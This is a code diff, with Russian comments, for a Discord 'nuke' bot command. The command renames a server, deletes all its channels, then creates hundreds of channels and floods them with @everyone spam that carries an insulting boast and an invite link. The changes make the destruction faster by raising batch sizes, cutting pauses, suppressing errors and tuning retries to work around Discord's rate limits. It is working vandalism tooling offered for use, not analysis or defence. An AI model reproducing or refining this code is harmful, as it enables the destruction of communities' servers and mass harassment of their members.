@@ -5,9 +5,10 @@ import time
 
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
 
-# Глобальный счетчик для контроля скорости
+# Глобальные переменные
 channel_counter = 0
 start_time = 0
+rate_limit_hits = 0
 
 @bot.event
 async def on_ready():
@@ -15,9 +16,10 @@ async def on_ready():
 
 @bot.command()
 async def nuke(ctx):
-    global channel_counter, start_time
+    global channel_counter, start_time, rate_limit_hits
     channel_counter = 0
     start_time = time.time()
+    rate_limit_hits = 0
     
     await ctx.send("**nonerp ebet**")
     
@@ -30,8 +32,8 @@ async def nuke(ctx):
     except:
         print("❌ Не удалось изменить название")
     
-    # 2. МАКСИМАЛЬНО БЫСТРОЕ УДАЛЕНИЕ КАНАЛОВ (пачками по 5)
-    print("🗑️ МАКСИМАЛЬНО БЫСТРОЕ удаление каналов...")
+    # 2. СУПЕР-БЫСТРОЕ УДАЛЕНИЕ КАНАЛОВ (пачками по 8)
+    print("🗑️ СУПЕР-БЫСТРОЕ удаление каналов...")
     
     deleted = 0
     skipped = 0
@@ -54,35 +56,23 @@ async def nuke(ctx):
     async def delete_single_channel(channel):
         try:
             await channel.delete()
-            print(f"   ✅ Удален: #{channel.name}")
             return True
-        except discord.Forbidden:
-            print(f"   ⚠️ Нет прав: #{channel.name}")
-            return False
-        except discord.HTTPException as e:
-            if "59074" in str(e):
-                print(f"   🛡️ Защищенный: #{channel.name}")
-                return False
-            else:
-                print(f"   ❌ Ошибка: {e}")
-                return False
-        except Exception as e:
-            print(f"   ❌ Ошибка: #{channel.name} - {e}")
+        except:
             return False
     
-    # Удаляем пачками по 5 каналов
-    batch_size = 5
+    # Удаляем пачками по 8 каналов
+    batch_size = 8
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
         await delete_channels_batch(batch)
         
-        # Минимальная пауза между пачками
-        if (i // batch_size) % 10 == 0:  # После каждых 10 пачек
-            await asyncio.sleep(0.2)
+        # Минимальные паузы
+        if (i // batch_size) % 5 == 0:  # После каждых 5 пачек
+            await asyncio.sleep(0.1)
         else:
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.02)
         
-        if (i + batch_size) % 20 == 0:
+        if (i + batch_size) % 40 == 0:
             print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
     
     print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
@@ -90,29 +80,29 @@ async def nuke(ctx):
     # Пауза перед созданием
     await asyncio.sleep(1)
     
-    # 3. МАКСИМАЛЬНО БЫСТРОЕ СОЗДАНИЕ (4 канала в секунду)
-    print("🔥 МАКСИМАЛЬНО БЫСТРОЕ создание каналов (4/сек)...")
+    # 3. МАКСИМАЛЬНО АГРЕССИВНОЕ СОЗДАНИЕ (6-7 каналов в секунду)
+    print("🔥 АГРЕССИВНОЕ создание 400+ каналов...")
     
     SPAM_TEXT = """@everyone
 **ТРАХНУТЫ BY GVK**
 
-https://discord.gg/sYvDS9mNst
+https://discord.gg/3B3yEVwGb5
 
-ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ВЕЛИКИМ GVK
+ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
 """
     
     created = 0
     failed = 0
-    max_channels = 500
+    target_channels = 400
     
-    # Создаем пачками по 4 канала (4 в секунду)
+    # Создаем пачками по 6 каналов
     async def create_channel_batch(batch_num):
-        nonlocal created, failed
+        nonlocal created, failed, rate_limit_hits
         tasks = []
         
-        for j in range(4):  # 4 канала в пачке
-            i = batch_num * 4 + j
-            if i >= max_channels:
+        for j in range(6):  # 6 каналов в пачке
+            i = batch_num * 6 + j
+            if i >= target_channels:
                 break
             tasks.append(create_single_channel(i))
         
@@ -128,22 +118,24 @@ https://discord.gg/sYvDS9mNst
                 failed += 1
     
     async def create_single_channel(i):
+        global channel_counter, rate_limit_hits
+        
         try:
             # Создаем канал
             ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
             
             # Отправляем 5 сообщений МАКСИМАЛЬНО БЫСТРО
-            # Используем gather для параллельной отправки
             messages = [ch.send(SPAM_TEXT) for _ in range(5)]
             await asyncio.gather(*messages)
             
-            # Считаем скорость
-            global channel_counter
             channel_counter += 1
-            elapsed = time.time() - start_time
-            speed = channel_counter / elapsed if elapsed > 0 else 0
             
-            print(f"✅ [{i+1}] Создан (скорость: {speed:.1f}/сек)")
+            # Показываем скорость каждые 10 каналов
+            if channel_counter % 10 == 0:
+                elapsed = time.time() - start_time
+                speed = channel_counter / elapsed if elapsed > 0 else 0
+                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
+            
             return True
             
         except discord.Forbidden:
@@ -151,37 +143,64 @@ https://discord.gg/sYvDS9mNst
             return False
         except discord.HTTPException as e:
             if "rate" in str(e).lower():
-                print(f"⚠️ Rate limit на канале {i+1}, жду...")
-                await asyncio.sleep(0.3)
+                rate_limit_hits += 1
+                wait_time = min(rate_limit_hits * 0.1, 0.5)
+                print(f"⚠️ Rate limit #{rate_limit_hits}, жду {wait_time:.1f}с")
+                await asyncio.sleep(wait_time)
                 return await create_single_channel(i)
             else:
-                print(f"❌ Ошибка канала {i+1}: {e}")
+                print(f"❌ Ошибка: {e}")
                 return False
         except Exception as e:
-            print(f"❌ Ошибка {i+1}: {e}")
+            print(f"❌ Ошибка: {e}")
             return False
     
-    # Создаем пачками по 4 канала
-    batch_size = 4
-    max_batches = max_channels // batch_size + 1
+    # АГРЕССИВНОЕ создание с динамическими паузами
+    batch_size = 6
+    max_batches = target_channels // batch_size + 1
+    last_speed_check = time.time()
+    speed_samples = []
     
     for batch_num in range(max_batches):
         await create_channel_batch(batch_num)
         
-        # Пауза чтобы держать скорость 4/сек
-        # 4 канала за ~0.5-0.7 сек, значит пауза ~0.3-0.5 сек
-        await asyncio.sleep(0.15)  # Минимальная пауза
+        # Динамическая пауза в зависимости от скорости
+        elapsed = time.time() - start_time
+        current_speed = channel_counter / elapsed if elapsed > 0 else 0
         
-        # Показываем прогресс каждые 20 каналов
-        if created > 0 and created % 20 == 0:
+        # Если скорость падает, уменьшаем паузу
+        if current_speed < 5:
+            pause = 0.05  # Маленькая пауза
+        elif current_speed < 6:
+            pause = 0.08
+        else:
+            pause = 0.12  # Нормальная пауза
+        
+        # Если много rate_limit, увеличиваем паузу
+        if rate_limit_hits > 10:
+            pause += 0.05
+        
+        await asyncio.sleep(pause)
+        
+        # Проверка скорости каждые 2 секунды
+        if time.time() - last_speed_check > 2:
+            speed_samples.append(current_speed)
+            if len(speed_samples) > 5:
+                speed_samples.pop(0)
+            avg_speed = sum(speed_samples) / len(speed_samples)
+            print(f"⚡ Средняя скорость: {avg_speed:.1f}/сек")
+            last_speed_check = time.time()
+        
+        # Если достигли цели
+        if created >= target_channels:
+            print(f"✅ Достигнута цель: {created} каналов")
+            break
+        
+        # Показываем прогресс
+        if created % 50 == 0 and created > 0:
             elapsed = time.time() - start_time
             speed = created / elapsed if elapsed > 0 else 0
-            print(f"📊 Прогресс: {created} каналов, скорость: {speed:.1f}/сек")
-        
-        # Если достигли лимита
-        if created >= max_channels:
-            print("⚠️ Достигнут лимит каналов")
-            break
+            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
     
     print("\n" + "="*50)
     print("💀 НЬЮК ЗАВЕРШЁН 💀")
@@ -190,6 +209,7 @@ https://discord.gg/sYvDS9mNst
     print(f"❌ Ошибок: {failed}")
     print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
     print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
+    print(f"⚠️ Rate limit попаданий: {rate_limit_hits}")
     print("="*50)
     
     try:
